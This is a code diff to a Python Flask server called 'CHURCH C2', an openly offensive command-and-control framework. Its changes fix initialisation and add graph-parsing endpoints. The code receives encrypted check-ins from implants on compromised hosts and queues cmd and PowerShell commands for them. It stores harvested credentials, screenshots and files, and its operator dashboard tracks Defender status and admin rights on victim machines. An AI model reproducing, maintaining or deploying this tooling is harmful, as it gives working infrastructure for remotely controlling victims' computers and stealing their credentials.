@@ -103,13 +103,13 @@ app.config['SESSION_COOKIE_SECURE'] = True   # only over HTTPS
 app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
 
-# Rate limiter
+# Rate limiter – fixed for flask-limiter >= 4.0
 limiter = Limiter(
-    app,
     key_func=get_remote_address,
     default_limits=["200 per day", "50 per hour"],
     storage_uri="memory://"
 )
+limiter.init_app(app)
 
 # SocketIO with strict CORS
 socketio = SocketIO(
@@ -124,7 +124,7 @@ def init_database():
     """Initialize SQLite database with all tables (idempotent)"""
     conn = sqlite3.connect(DATABASE_PATH)
     c = conn.cursor()
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS beacons (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT UNIQUE NOT NULL,
@@ -147,7 +147,7 @@ def init_database():
         sleep_time INTEGER DEFAULT 120,
         notes TEXT
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS tasks (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -161,7 +161,7 @@ def init_database():
         completed_at REAL,
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS results (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -170,7 +170,7 @@ def init_database():
         timestamp REAL,
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS files (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -182,7 +182,7 @@ def init_database():
         created_at REAL,
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS credentials (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -193,7 +193,7 @@ def init_database():
         timestamp REAL,
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -201,14 +201,14 @@ def init_database():
         timestamp REAL,
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS tags (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
         tag TEXT NOT NULL,
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         username TEXT UNIQUE NOT NULL,
@@ -216,7 +216,7 @@ def init_database():
         role TEXT DEFAULT 'operator',
         created_at REAL
     )''')
-    
+
     c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         username TEXT,
@@ -225,13 +225,13 @@ def init_database():
         timestamp REAL,
         ip_address TEXT
     )''')
-    
+
     # Insert default admin if not exists
     c.execute("SELECT * FROM users WHERE username = ?", (ADMIN_USERNAME,))
     if not c.fetchone():
         c.execute("INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
                   (ADMIN_USERNAME, ADMIN_PASSWORD_HASH, 'admin', time.time()))
-    
+
     conn.commit()
     conn.close()
 
@@ -248,7 +248,7 @@ class CryptoManager:
         plaintext = decryptor.update(ciphertext) + decryptor.finalize()
         pad_len = plaintext[-1]
         return plaintext[:-pad_len] if pad_len <= 16 else plaintext
-    
+
     @staticmethod
     def encrypt_aes(plaintext: bytes) -> str:
         """AES-256-CBC encryption without extra whitespace"""
@@ -285,10 +285,10 @@ class Beacon:
     jitter_max: int = 180
     sleep_time: int = 120
     notes: str = ""
-    
+
     def to_dict(self) -> dict:
         return asdict(self)
-    
+
     @staticmethod
     def from_db_row(row) -> 'Beacon':
         return Beacon(
@@ -306,7 +306,7 @@ class BeaconManager:
         self._beacons: Dict[str, Beacon] = {}
         self._lock = threading.Lock()
         self._load_from_db()
-    
+
     def _load_from_db(self):
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
@@ -315,11 +315,11 @@ class BeaconManager:
             beacon = Beacon.from_db_row(row)
             self._beacons[beacon.beacon_id] = beacon
         conn.close()
-    
+
     def update_beacon(self, data: dict) -> Beacon:
         # Use UUID to avoid collisions
         beacon_id = self._generate_beacon_id(data['computer'], data['user'])
-        
+
         with self._lock:
             if beacon_id not in self._beacons:
                 beacon = Beacon(
@@ -348,7 +348,7 @@ class BeaconManager:
                 beacon.defender_status = data.get('defender', beacon.defender_status)
                 self._update_beacon(beacon)
             return beacon
-    
+
     def _generate_beacon_id(self, computer: str, user: str) -> str:
         """Unique beacon ID using UUID to avoid collisions"""
         # Use deterministic UUID v5 based on computer+user to keep same ID across sessions
@@ -356,11 +356,11 @@ class BeaconManager:
         namespace = uuid.NAMESPACE_DNS
         name = f"{computer}\\{user}"
         return str(uuid.uuid5(namespace, name))
-    
+
     def _save_beacon(self, beacon: Beacon):
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
-        c.execute('''INSERT OR REPLACE INTO beacons 
+        c.execute('''INSERT OR REPLACE INTO beacons
             (beacon_id, computer_name, username, process_id, os_version, is_admin,
              path, defender_status, uptime, install_date, domain, antivirus,
              first_seen, last_seen, status, jitter_min, jitter_max, sleep_time, notes)
@@ -373,10 +373,10 @@ class BeaconManager:
              beacon.jitter_min, beacon.jitter_max, beacon.sleep_time, beacon.notes))
         conn.commit()
         conn.close()
-    
+
     def _update_beacon(self, beacon: Beacon):
         self._save_beacon(beacon)
-    
+
     def get_pending_tasks(self, beacon_id: str) -> List[dict]:
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
@@ -384,16 +384,16 @@ class BeaconManager:
         tasks = [{'id': row[0], 'command': row[1], 'args': row[2] or '', 'ps': row[3] == 'powershell'} for row in c.fetchall()]
         conn.close()
         return tasks
-    
+
     def mark_task_completed(self, task_id: int, output: str):
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
-        c.execute("UPDATE tasks SET status = 'completed', output = ?, completed_at = ? WHERE id = ?", 
+        c.execute("UPDATE tasks SET status = 'completed', output = ?, completed_at = ? WHERE id = ?",
                   (output, time.time(), task_id))
         conn.commit()
         conn.close()
         self._audit("task_completed", str(task_id))
-    
+
     def add_task(self, beacon_id: str, command: str, args: str = "", task_type: str = "cmd") -> int:
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
@@ -405,7 +405,7 @@ class BeaconManager:
         conn.close()
         self._audit("task_added", f"{beacon_id}: {command}")
         return task_id
-    
+
     def _audit(self, action: str, target: str):
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
@@ -413,15 +413,16 @@ class BeaconManager:
                   ("system", action, target, time.time(), "127.0.0.1"))
         conn.commit()
         conn.close()
-    
+
     def get_all_beacons(self) -> List[Beacon]:
         with self._lock:
             return list(self._beacons.values())
-    
+
     def get_beacon(self, beacon_id: str) -> Optional[Beacon]:
         return self._beacons.get(beacon_id)
 
-beacon_manager = BeaconManager()
+# instantiate beacon_manager later after DB init
+beacon_manager = None
 
 # ==================== WEB UI TEMPLATES ====================
 HTML_TEMPLATE = '''
@@ -431,9 +432,9 @@ HTML_TEMPLATE = '''
     <title>CHURCH C2 - Command & Control</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Courier New', monospace; 
-            background: #0a0e27; 
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0e27;
             color: #00ffaa;
             padding: 20px;
         }
@@ -569,7 +570,7 @@ HTML_TEMPLATE = '''
         <h1> CHURCH C2 </h1>
         <p>Command & Control Framework v{{ version }} | Encrypted Channel Active</p>
     </div>
-    
+
     <div class="stats">
         <div class="stat-card">
             <div class="number" id="onlineCount">0</div>
@@ -584,7 +585,7 @@ HTML_TEMPLATE = '''
             <div class="label">Credentials Harvested</div>
         </div>
     </div>
-    
+
     <div class="beacon-table">
         <table>
             <thead>
@@ -593,7 +594,7 @@ HTML_TEMPLATE = '''
             <tbody id="beaconList"></tbody>
         </table>
     </div>
-    
+
     <div class="command-bar">
         <h3>Command Interface</h3>
         <select id="targetBeacon">
@@ -613,7 +614,7 @@ HTML_TEMPLATE = '''
         <input type="text" id="commandInput" placeholder="Enter command...">
         <button onclick="sendCommand()">EXECUTE</button>
     </div>
-    
+
     <div id="beaconModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeModal()">&times;</span>
@@ -624,15 +625,15 @@ HTML_TEMPLATE = '''
             <button onclick="sendQuickCommand()" style="margin-top:10px;">Execute</button>
         </div>
     </div>
-    
+
     <script>
         var socket = io();
         var currentBeacon = null;
-        
+
         socket.on('connect', function() { console.log('Connected to C2 server'); });
         socket.on('beacon_update', function(data) { refreshBeacons(); });
         socket.on('task_result', function(data) { updateLog(data); });
-        
+
         function refreshBeacons() {
             fetch('/api/beacons')
                 .then(res => res.json())
@@ -642,7 +643,7 @@ HTML_TEMPLATE = '''
                     tbody.innerHTML = '';
                     select.innerHTML = '<option value="">Select Beacon</option>';
                     document.getElementById('onlineCount').innerText = data.length;
-                    
+
                     data.forEach(beacon => {
                         var row = tbody.insertRow();
                         row.onclick = function() { showBeacon(beacon.beacon_id); };
@@ -654,7 +655,7 @@ HTML_TEMPLATE = '''
                         row.insertCell(5).innerHTML = beacon.defender_status == 1 ? 'Disabled' : beacon.defender_status == 0 ? 'Enabled' : 'Unknown';
                         row.insertCell(6).innerHTML = new Date(beacon.last_seen * 1000).toLocaleString();
                         row.insertCell(7).innerHTML = '<span class="status-active">● Active</span>';
-                        
+
                         var opt = document.createElement('option');
                         opt.value = beacon.beacon_id;
                         opt.text = beacon.computer_name + '\\' + beacon.username;
@@ -662,14 +663,14 @@ HTML_TEMPLATE = '''
                     });
                 });
         }
-        
+
         function sendCommand() {
             var beacon = document.getElementById('targetBeacon').value;
             var command = document.getElementById('commandInput').value;
             var preset = document.getElementById('commandPreset').value;
             if (preset) command = preset;
             if (!beacon || !command) return;
-            
+
             fetch('/api/task', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -679,14 +680,14 @@ HTML_TEMPLATE = '''
                 document.getElementById('commandInput').value = '';
             });
         }
-        
+
         function showBeacon(beaconId) {
             currentBeacon = beaconId;
             fetch('/api/beacon/' + beaconId)
                 .then(res => res.json())
                 .then(data => {
                     document.getElementById('modalTitle').innerHTML = 'Beacon: ' + data.computer_name;
-                    document.getElementById('modalContent').innerHTML = 
+                    document.getElementById('modalContent').innerHTML =
                         '<p><strong>User:</strong> ' + data.username + '</p>' +
                         '<p><strong>OS:</strong> ' + data.os_version + '</p>' +
                         '<p><strong>Admin:</strong> ' + (data.is_admin ? 'Yes' : 'No') + '</p>' +
@@ -698,7 +699,7 @@ HTML_TEMPLATE = '''
                     loadCommandLog(beaconId);
                 });
         }
-        
+
         function loadCommandLog(beaconId) {
             fetch('/api/tasks/' + beaconId)
                 .then(res => res.json())
@@ -711,7 +712,7 @@ HTML_TEMPLATE = '''
                     });
                 });
         }
-        
+
         function sendQuickCommand() {
             var cmd = document.getElementById('quickCommand').value;
             if (!currentBeacon || !cmd) return;
@@ -724,11 +725,11 @@ HTML_TEMPLATE = '''
                 document.getElementById('quickCommand').value = '';
             });
         }
-        
+
         function closeModal() {
             document.getElementById('beaconModal').style.display = 'none';
         }
-        
+
         setInterval(refreshBeacons, 5000);
         refreshBeacons();
     </script>
@@ -756,13 +757,13 @@ def login():
     data = request.json
     username = data.get('username')
     password = data.get('password')
-    
+
     conn = sqlite3.connect(DATABASE_PATH)
     c = conn.cursor()
     c.execute("SELECT password_hash, role FROM users WHERE username = ?", (username,))
     row = c.fetchone()
     conn.close()
-    
+
     if row and check_password_hash(row[0], password):
         session['authenticated'] = True
         session['username'] = username
@@ -822,19 +823,19 @@ def beacon_handler():
     data = request.form.get('d') or request.form.get('data')
     if not data:
         return "No data", 400
-    
+
     try:
         decrypted = CryptoManager.decrypt_aes(data)
         beacon_data = json.loads(decrypted.decode())
     except Exception as e:
         logging.error(f"Decrypt failed: {e}")
         return "Bad data", 400
-    
+
     beacon = beacon_manager.update_beacon(beacon_data)
     logging.info(f"BEACON: {beacon.computer_name}\\{beacon.username} | Admin: {beacon.is_admin} | Defender: {beacon.defender_status}")
-    
+
     pending_tasks = beacon_manager.get_pending_tasks(beacon.beacon_id)
-    
+
     if pending_tasks:
         task = pending_tasks[0]
         response = json.dumps({
@@ -845,7 +846,7 @@ def beacon_handler():
         })
     else:
         response = json.dumps({"task_id": 0, "command": "", "args": "", "ps": False})
-    
+
     encrypted_response = CryptoManager.encrypt_aes(response.encode())
     socketio.emit('beacon_update', {'beacon_id': beacon.beacon_id})
     return encrypted_response, 200, {'Content-Type': 'application/octet-stream'}
@@ -857,20 +858,20 @@ def task_result():
     data = request.form.get('d') or request.form.get('data')
     if not data:
         return "No data", 400
-    
+
     try:
         decrypted = CryptoManager.decrypt_aes(data)
         result_data = json.loads(decrypted.decode())
     except:
         return "Bad data", 400
-    
+
     task_id = result_data.get('task_id', 0)
     output = result_data.get('output', '')
-    
+
     if task_id:
         beacon_manager.mark_task_completed(task_id, output)
         socketio.emit('task_result', {'task_id': task_id, 'output': output})
-    
+
     return "OK", 200
 
 @app.route('/api/beacons', methods=['GET'])
@@ -896,16 +897,16 @@ def api_add_task():
     data = request.json
     if not data or 'host' not in data or 'command' not in data:
         return jsonify({"error": "Missing host or command"}), 400
-    
+
     beacon = None
     for b in beacon_manager.get_all_beacons():
         if b.beacon_id == data['host'] or b.computer_name == data['host']:
             beacon = b
             break
-    
+
     if not beacon:
         return jsonify({"error": "Beacon not found"}), 404
-    
+
     task_id = beacon_manager.add_task(
         beacon.beacon_id,
         data['command'],
@@ -945,6 +946,183 @@ def api_stats():
         "version": VERSION
     })
 
+# ==================== C2 PARSER (NEW) ====================
+class LanternCompatibilityParser:
+    """
+    Bridges CHURCH C2 format to Lantern.js graph format.
+    Converts beacon data to graph nodes/edges for visualization.
+    """
+    @staticmethod
+    def beacon_to_graph(beacon_data: dict) -> dict:
+        """Convert beacon data to Lantern.js graph format"""
+        nodes = []
+        edges = []
+        environments = {}
+
+        # Extract environment info
+        env_id = f"env_{beacon_data.get('computer', '').lower()}"
+        hostname = beacon_data.get('computer', 'unknown')
+
+        # Build environment node
+        env_node = {
+            "id": env_id,
+            "type": "environment",
+            "label": hostname,
+            "info": {
+                "hostname": hostname,
+                "username": beacon_data.get('user', ''),
+                "os": beacon_data.get('os', 'Unknown'),
+                "admin": beacon_data.get('admin', False),
+                "pid": beacon_data.get('pid', 0),
+                "defender_status": beacon_data.get('defender', 2),
+                "source": "c2",
+                "has_nmap": False,
+                "enabled": True,
+            },
+            "status": "online" if beacon_data.get('last_seen') else "stale",
+            "default_tags": [hostname, beacon_data.get('user', '')]
+        }
+        nodes.append(env_node)
+
+        # Store in environments dict for the graph
+        environments[env_id] = {
+            "hostname": hostname,
+            "source": "c2",
+            "data": {
+                "health": {
+                    "hostname": hostname,
+                    "os": beacon_data.get('os', 'Unknown'),
+                    "username": beacon_data.get('user', ''),
+                    "process_count": 1,
+                }
+            },
+            "scan": {
+                "metadata": {
+                    "total_processes": 1,
+                    "total_listeners": 0,
+                },
+                "nodes": []
+            }
+        }
+
+        # Add process nodes if available
+        processes = beacon_data.get('processes', [])
+        for proc in processes[:20]:  # Limit for performance
+            proc_id = f"{env_id}__proc_{proc.get('pid', 'unknown')}"
+            proc_node = {
+                "id": proc_id,
+                "type": "process",
+                "label": proc.get('name', 'unknown'),
+                "info": {
+                    "pid": proc.get('pid'),
+                    "username": proc.get('user'),
+                    "cpu": proc.get('cpu'),
+                    "memory": proc.get('memory'),
+                },
+                "_envId": env_id
+            }
+            nodes.append(proc_node)
+            edges.append({
+                "source": env_id,
+                "target": proc_id,
+                "type": "ownership",
+                "label": ""
+            })
+
+        return {
+            "nodes": nodes,
+            "edges": edges,
+            "environments": environments,
+            "metadata": {
+                "total_environments": 1,
+                "timestamp": beacon_data.get('timestamp', '')
+            }
+        }
+
+    @staticmethod
+    def result_to_event(result_data: dict) -> dict:
+        """Convert command result to audit event"""
+        return {
+            "event_type": "task_result",
+            "category": "task",
+            "detail": f"Task {result_data.get('task_id', '?')} completed",
+            "timestamp": result_data.get('timestamp'),
+            "source": "c2_beacon",
+            "data": result_data
+        }
+
+# New parser routes
+@app.route('/api/beacon/parse', methods=['POST'])
+@limiter.limit("10 per minute")
+def parse_beacon():
+    """Parse raw beacon data without storing it."""
+    data = request.form.get('d') or request.form.get('data')
+    if not data:
+        return jsonify({"error": "No data"}), 400
+
+    try:
+        decrypted = CryptoManager.decrypt_aes(data)
+        beacon_data = json.loads(decrypted.decode())
+    except Exception as e:
+        logging.error(f"Parse decrypt failed: {e}")
+        return jsonify({"error": "Decryption failed"}), 400
+
+    graph_data = LanternCompatibilityParser.beacon_to_graph(beacon_data)
+    return jsonify({
+        "beacon": beacon_data,
+        "graph": graph_data
+    })
+
+@app.route('/api/beacon/graph', methods=['POST'])
+@limiter.limit("10 per minute")
+def beacon_to_graph():
+    """Direct endpoint to convert beacon to graph for Lantern.js."""
+    data = request.form.get('d') or request.form.get('data')
+    if not data:
+        return jsonify({"error": "No data"}), 400
+
+    try:
+        decrypted = CryptoManager.decrypt_aes(data)
+        beacon_data = json.loads(decrypted.decode())
+    except Exception as e:
+        logging.error(f"Graph decrypt failed: {e}")
+        return jsonify({"error": "Decryption failed"}), 400
+
+    graph_data = LanternCompatibilityParser.beacon_to_graph(beacon_data)
+    return jsonify(graph_data)
+
+@app.route('/api/beacon/result/parse', methods=['POST'])
+@limiter.limit("10 per minute")
+def parse_result():
+    """Parse command result output."""
+    data = request.form.get('d') or request.form.get('data')
+    if not data:
+        return jsonify({"error": "No data"}), 400
+
+    try:
+        decrypted = CryptoManager.decrypt_aes(data)
+        result_data = json.loads(decrypted.decode())
+    except Exception as e:
+        logging.error(f"Result parse decrypt failed: {e}")
+        return jsonify({"error": "Decryption failed"}), 400
+
+    event = LanternCompatibilityParser.result_to_event(result_data)
+
+    # Store in audit log
+    conn = sqlite3.connect(DATABASE_PATH)
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO audit_log (username, action, target, timestamp, ip_address) VALUES (?, ?, ?, ?, ?)",
+        ("system", event['detail'], str(result_data.get('task_id', '0')), time.time(), request.remote_addr)
+    )
+    conn.commit()
+    conn.close()
+
+    return jsonify({
+        "result": result_data,
+        "event": event
+    })
+
 # ==================== WEBSOCKET EVENTS ====================
 @socketio.on('connect')
 def handle_connect():
@@ -960,7 +1138,7 @@ class C2Logger:
     def __init__(self, log_path: str):
         self.log_path = log_path
         self._setup_logging()
-    
+
     def _setup_logging(self):
         logging.basicConfig(
             level=logging.INFO,
@@ -970,13 +1148,13 @@ class C2Logger:
                 logging.StreamHandler(sys.stdout)
             ]
         )
-    
+
     def log_beacon(self, beacon_id: str, action: str, details: str = ""):
         logging.info(f"BEACON[{beacon_id}] {action}: {details}")
-    
+
     def log_task(self, beacon_id: str, task: str):
         logging.info(f"TASK[{beacon_id}] {task}")
-    
+
     def log_error(self, error: str):
         logging.error(f"ERROR: {error}")
 
@@ -995,34 +1173,44 @@ def cleanup_old_beacons():
 
 # ==================== MAIN ====================
 def main():
+    global beacon_manager
+
     parser = argparse.ArgumentParser(description='CHURCH C2 Server - Hardened APT Grade')
     parser.add_argument('--host', default='0.0.0.0', help='Bind address')
     parser.add_argument('--port', type=int, default=443, help='Bind port (HTTPS only)')
     parser.add_argument('--cert', default=SSL_CERT, help='SSL certificate path')
     parser.add_argument('--key', default=SSL_KEY, help='SSL key path')
     args = parser.parse_args()
-    
-    # Initialize
+
+    # Initialize database FIRST
     init_database()
+
+    # Now instantiate beacon manager (tables exist)
+    beacon_manager = BeaconManager()
+
     os.makedirs(DOWNLOAD_PATH, exist_ok=True)
     os.makedirs(PLUGIN_PATH, exist_ok=True)
-    
+
     # Start cleanup thread
     cleanup_thread = threading.Thread(target=cleanup_old_beacons, daemon=True)
     cleanup_thread.start()
-    
+
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
     ║                    CHURCH C2 SERVER v2.1                      ║
     ║                      by ek0ms savi0r                          ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
-    
+
     print(f"[*] Starting C2 server on {args.host}:{args.port} (HTTPS only)")
     print(f"[*] Web UI: https://{args.host}:{args.port}")
     print(f"[*] API Key (for external tools): {JWT_SECRET}")
     print(f"[*] Admin login: {ADMIN_USERNAME} (use password from config/env or random printed above)")
-    
+    print("[*] Parser endpoints added:")
+    print("    POST /api/beacon/parse       - Parse raw beacon to JSON + graph")
+    print("    POST /api/beacon/graph       - Convert to Lantern.js graph format")
+    print("    POST /api/beacon/result/parse - Parse command results")
+
     socketio.run(app, host=args.host, port=args.port, ssl_context=(args.cert, args.key), debug=False)
 
 if __name__ == '__main__':
